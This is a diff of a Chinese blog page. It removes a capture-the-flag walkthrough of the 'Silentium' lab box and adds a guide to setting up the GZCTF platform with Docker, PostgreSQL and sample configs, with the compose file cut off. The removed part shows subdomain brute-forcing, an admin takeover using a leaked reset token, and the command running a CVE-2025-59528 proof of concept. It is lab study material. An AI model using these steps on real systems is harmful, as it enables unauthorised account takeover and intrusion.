@@ -19,53 +19,28 @@
   <meta name="author" content="Colourful">
   <meta name="keywords" content="">
   
-    <meta name="description" content="UserFlag CVE-2025-59528  先用nmap扫一下 1nmap -A 10.129.137.240   22端口ssh服务 80端口web服务需要重定向  子域名爆破 1ffuf -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;Info&#x2F;SecLists-master&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-20000.txt:FUZZ -u htt">
+    <meta name="description" content="Docker安装更新系统包 1sudo apt update  安装docker（版本为 26.1.3ubuntu124.04.1） 1apt install docker.io  验证是否安装成功（尝试拉取hello world镜像） 1sudo docker run hello-world  安装docker-compose 1apt install docker-compose  更换更换d">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Silentium">
-<meta property="og:url" content="https://colourful228.github.io/2026/04/16/Silentium/index.html">
+<meta property="og:title" content="GZCTF平台搭建">
+<meta property="og:url" content="https://colourful228.github.io/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/index.html">
 <meta property="og:site_name" content="Colourful">
-<meta property="og:description" content="UserFlag CVE-2025-59528  先用nmap扫一下 1nmap -A 10.129.137.240   22端口ssh服务 80端口web服务需要重定向  子域名爆破 1ffuf -w &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;Info&#x2F;SecLists-master&#x2F;Discovery&#x2F;DNS&#x2F;subdomains-top1million-20000.txt:FUZZ -u htt">
+<meta property="og:description" content="Docker安装更新系统包 1sudo apt update  安装docker（版本为 26.1.3ubuntu124.04.1） 1apt install docker.io  验证是否安装成功（尝试拉取hello world镜像） 1sudo docker run hello-world  安装docker-compose 1apt install docker-compose  更换更换d">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002132995.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002136134.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002138626.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002141091.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002143897.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002146393.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002149031.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002151802.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002154455.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002157299.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002159914.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002202896.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002205852.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002209671.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002213070.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002215832.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002219300.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002222190.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002226086.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002228938.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002232134.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002236195.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002245711.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002242826.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002249485.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002252224.png">
-<meta property="og:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002255227.png">
-<meta property="article:published_time" content="2026-04-15T17:27:47.000Z">
-<meta property="article:modified_time" content="2026-04-16T16:22:56.981Z">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20260419000802164.png">
+<meta property="og:image" content="https://colourful228.github.io/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20260419000806420.png">
+<meta property="article:published_time" content="2026-04-16T17:06:28.000Z">
+<meta property="article:modified_time" content="2026-04-18T16:08:07.427Z">
 <meta property="article:author" content="Colourful">
-<meta property="article:tag" content="渗透">
+<meta property="article:tag" content="环境部署">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://colourful228.github.io/2026/04/16/Silentium/image-20260417002132995.png">
+<meta name="twitter:image" content="https://colourful228.github.io/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20260419000802164.png">
 <meta name="twitter:creator" content="@Colorful">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Silentium - Colourful</title>
+  <title>GZCTF平台搭建 - Colourful</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -353,7 +328,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Silentium"></span>
+            <span id="subtitle" data-typed-text="GZCTF平台搭建"></span>
           
         </div>
 
@@ -369,8 +344,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2026-04-16 01:27" pubdate>
-          2026年4月16日 凌晨
+        <time datetime="2026-04-17 01:06" pubdate>
+          2026年4月17日 凌晨
         </time>
       </span>
     
@@ -381,7 +356,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          688 字
+          642 字
         
       </span>
     
@@ -442,12 +417,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Silentium</h1>
+            <h1 id="seo-header">GZCTF平台搭建</h1>
             
               <p id="updated-time" class="note note-info" style="display: none">
                 
                   
-                    本文最后更新于 2026-04-17T00:22:56+08:00
+                    本文最后更新于 2026-04-19T00:08:07+08:00
                   
                   
 
@@ -457,106 +432,45 @@
             
               <div class="markdown-body">
                 
-                <h1 id="UserFlag"><a href="#UserFlag" class="headerlink" title="UserFlag"></a>UserFlag</h1><blockquote>
-<p>CVE-2025-59528</p>
+                <h1 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h1><p>更新系统包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> apt update<br></code></pre></td></tr></table></figure>
+
+<p>安装docker（版本为 26.1.3ubuntu124.04.1）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker.io<br></code></pre></td></tr></table></figure>
+
+<p>验证是否安装成功（尝试拉取hello world镜像）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> docker run hello-world<br></code></pre></td></tr></table></figure>
+
+<p>安装docker-compose</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt install docker-compose<br></code></pre></td></tr></table></figure>
+
+<p>更换更换docker镜像源</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">tee</span> /etc/docker/daemon.json &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">&#123;</span><br><span class="hljs-string">    &quot;registry-mirrors&quot;: [</span><br><span class="hljs-string">        &quot;https://hub.uuuadc.top&quot;,</span><br><span class="hljs-string">        &quot;https://docker.anyhub.us.kg&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.jobcher.com&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.icu&quot;,</span><br><span class="hljs-string">        &quot;https://docker.ckyl.me&quot;,</span><br><span class="hljs-string">        &quot;https://docker.awsl9527.cn&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://docker.laoex.link&quot;,</span><br><span class="hljs-string">        &quot;https://docker.m.daocloud.io&quot;,</span><br><span class="hljs-string">        &quot;https://noohub.ru&quot;,</span><br><span class="hljs-string">        &quot;https://huecker.io&quot;,</span><br><span class="hljs-string">        &quot;https://dockerhub.timeweb.cloud&quot;,</span><br><span class="hljs-string">        &quot;https://docker.rainbond.cc&quot;,</span><br><span class="hljs-string">        &quot;https://docker.1panel.live&quot;,</span><br><span class="hljs-string">        &quot;https://hub.rat.dev&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">EOF</span><br>systemctl daemon-reload<br>systemctl restart docker<br></code></pre></td></tr></table></figure>
+
+<h1 id="PostgreSQL安装"><a href="#PostgreSQL安装" class="headerlink" title="PostgreSQL安装"></a>PostgreSQL安装</h1><blockquote>
+<p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yaoyushun/p/17627987.html">https://www.cnblogs.com/yaoyushun/p/17627987.html</a></p>
 </blockquote>
-<p>先用nmap扫一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -A 10.129.137.240<br></code></pre></td></tr></table></figure>
+<p>检查是否已经安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># psql 服务</span><br><span class="hljs-built_in">sudo</span> service postgresql status<br><span class="hljs-comment"># 版本查看</span><br>psql --version<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/16/Silentium/image-20260417002132995.png" srcset="/img/loading.gif" lazyload alt="image-20260417002132995"></p>
-<p>22端口ssh服务</p>
-<p>80端口web服务需要重定向</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002136134.png" srcset="/img/loading.gif" lazyload alt="image-20260417002136134"></p>
-<p>子域名爆破</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">ffuf -w <span class="hljs-regexp">/home/</span>kali<span class="hljs-regexp">/Desktop/</span>Info<span class="hljs-regexp">/SecLists-master/</span>Discovery<span class="hljs-regexp">/DNS/</span>subdomains-top1million-<span class="hljs-number">20000</span>.txt:FUZZ -u http:<span class="hljs-regexp">//</span>silentium.htb/ -H <span class="hljs-string">&#x27;Host: FUZZ.silentium.htb&#x27;</span> -mc <span class="hljs-number">200</span> -fw <span class="hljs-number">4</span><br></code></pre></td></tr></table></figure>
+<p>安装</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 更新安装源内容</span><br><span class="hljs-built_in">sudo</span> apt-get update<br><span class="hljs-comment"># postgresql-contrib 额外特性安装</span><br><span class="hljs-built_in">sudo</span> apt install postgresql postgresql-contrib<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/16/Silentium/image-20260417002138626.png" srcset="/img/loading.gif" lazyload alt="image-20260417002138626"></p>
-<p>添加到&#x2F;etc&#x2F;hosts中</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002141091.png" srcset="/img/loading.gif" lazyload alt="image-20260417002141091"></p>
-<p>访问<a target="_blank" rel="noopener" href="http://staging.silentium.htb/">http://staging.silentium.htb</a></p>
-<p><img src="/2026/04/16/Silentium/image-20260417002143897.png" srcset="/img/loading.gif" lazyload alt="image-20260417002143897"></p>
-<p>看到页面是Flowise - Build AI Agents, Visually，就去找相关的漏洞，发现了一个可利用的RCE和任意文件读取<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/ai-security/476409.html">https://www.freebuf.com/articles/ai-security/476409.html</a></p>
-<p><img src="/2026/04/16/Silentium/image-20260417002146393.png" srcset="/img/loading.gif" lazyload alt="image-20260417002146393"></p>
-<p>里面提到了三个CVE，CVE-2025-59528，CVE-2025-8943，CVE-2025-26319</p>
-<p>在这个登录界面尝试抓包</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002149031.png" srcset="/img/loading.gif" lazyload alt="image-20260417002149031"></p>
-<p><img src="/2026/04/16/Silentium/image-20260417002151802.png" srcset="/img/loading.gif" lazyload alt="image-20260417002151802"></p>
-<p>根据不同的报错发现可能存在ben用户，尝试爆破密码</p>
-<p>发现角落有一个忘记密码，依旧尝试抓包看一下</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002154455.png" srcset="/img/loading.gif" lazyload alt="image-20260417002154455"></p>
-<p>发现这里有一些身份信息</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002157299.png" srcset="/img/loading.gif" lazyload alt="image-20260417002157299"></p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;user&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;e26c9d6c-678c-4c10-9e36-01813e8fea73&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;admin&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;email&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ben@silentium.htb&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;credential&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;tempToken&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;GzXqBEoeLdzLKcbFIFQVuSZrCulcGWBtEJBmc4qvGqcL3XjLyEFjL61qTNBHFqBn&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;tokenExpiry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2026-04-16T12:05:46.075Z&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;active&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;createdDate&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2026-01-29T20:14:57.000Z&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;updatedDate&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;2026-04-16T11:50:46.000Z&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;createdBy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;e26c9d6c-678c-4c10-9e36-01813e8fea73&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;updatedBy&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;e26c9d6c-678c-4c10-9e36-01813e8fea73&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;organization&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;organizationUser&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;workspace&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;workspaceUser&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+<p>确认安装成功</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">psql --version<br><span class="hljs-built_in">sudo</span> service postgresql status<br></code></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/16/Silentium/image-20260417002159914.png" srcset="/img/loading.gif" lazyload alt="image-20260417002159914"></p>
-<p>点击修改密码</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002202896.png" srcset="/img/loading.gif" lazyload alt="image-20260417002202896"></p>
-<p>将刚刚得到的token信息填入，修改密码然后登录就行了（这里要快一点，他的token一直在变，如果第一次没成功可以多试几次）</p>
-<p><img src="/2026/04/16/Silentium/image-20260417002205852.png" srcset="/img/loading.gif" lazyload alt="image-20260417002205852"></p>
-<p><img src="/2026/04/16/Silentium/image-20260417002209671.png" srcset="/img/loading.gif" lazyload alt="image-20260417002209671"></p>
-<p>尝试利用CVE-2025-59528POC：<a target="_blank" rel="noopener" href="https://github.com/AzureADTrent/CVE-2025-58434-59528/blob/main">https://github.com/AzureADTrent/CVE-2025-58434-59528/blob/main</a></p>
-<p>创建虚拟环境</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m venv .venv<br><span class="hljs-built_in">source</span> .venv/bin/activate<br></code></pre></td></tr></table></figure>
+<p><img src="/2026/04/17/GZCTF%E5%B9%B3%E5%8F%B0%E6%90%AD%E5%BB%BA/image-20260419000802164.png" srcset="/img/loading.gif" lazyload alt="image-20260419000802164"></p>
+<h1 id="配置文件修改"><a href="#配置文件修改" class="headerlink" title="配置文件修改"></a>配置文件修改</h1><p>在目录下创建appsetting.jso内容如下</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;AllowedHosts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;ConnectionStrings&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Database&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Host=db:5432;Database=gzctf;Username=postgres;Password=Admin1234.&quot;</span> <span class="hljs-comment">//Password是你自己的数据库密码</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;EmailConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;SendMailAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;a@a.com&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Smtp&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;Host&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Port&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">587</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;XorKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Admin1234.&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">//同样的，你自己的密码</span><br>  <span class="hljs-attr">&quot;ContainerProvider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Docker&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;Kubernetes&quot;</span><br>    <span class="hljs-attr">&quot;PortMappingType&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Default&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;PlatformProxy&quot;</span><br>    <span class="hljs-attr">&quot;EnableTrafficCapture&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;PublicEntry&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;你自己的服务器ip&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;xxx.xxx.xxx.xxx&quot;</span><br>    <span class="hljs-comment">// optional</span><br>    <span class="hljs-attr">&quot;DockerConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;SwarmMode&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;Uri&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;RequestLogging&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;DisableRateLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;RegistryConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;UserName&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;Password&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ServerAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;CaptchaConfig&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;Provider&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;None&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// or &quot;CloudflareTurnstile&quot; or &quot;GoogleRecaptcha&quot;</span><br>    <span class="hljs-attr">&quot;SiteKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SITE_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;SecretKey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&lt;Your SECRET_KEY&gt;&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-comment">// optional</span><br>    <span class="hljs-attr">&quot;GoogleRecaptcha&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>      <span class="hljs-attr">&quot;VerifyAPIAddress&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://www.recaptcha.net/recaptcha/api/siteverify&quot;</span><span class="hljs-punctuation">,</span><br>      <span class="hljs-attr">&quot;RecaptchaThreshold&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;0.5&quot;</span><br>    <span class="hljs-punctuation">&#125;</span><br>  <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;ForwardedOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;ForwardedHeaders&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">5</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;ForwardLimit&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">1</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;TrustedNetworks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;192.168.12.0/8&quot;</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<p>运行代码</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 CVE-2025-59528.py -t http://staging.silentium.htb/ -e ben@silentium.htb <br></code></pre></td></tr></table></figure>
+<p>创建compose.yml文件，内容如下</p>
+<figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">services:</span><br>  <span class="hljs-attr">gzctf:</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">registry.cn-shanghai.aliyuncs.com/gztime/gzctf:develop</span><br>    <span class="hljs-attr">restart:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attr">environment:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;GZCTF_ADMIN_PASSWORD=&lt;Your GZCTF_ADMIN_PASSWORD&gt;&quot;</span><br>      <span class="hljs-comment"># choose your backend language `en_US` / `zh_CN` / `ja_JP` ...</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;LC_ALL=zh_CN.UTF-8&quot;</span><br>    <span class="hljs-attr">ports:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;8880:8080&quot;</span><br>    <span class="hljs-attr">volumes:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./data/files:/app/files&quot;</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;./appsettings.json:/app/appsettings.json:ro&quot;</span><br>      <span class="hljs-comment"># - 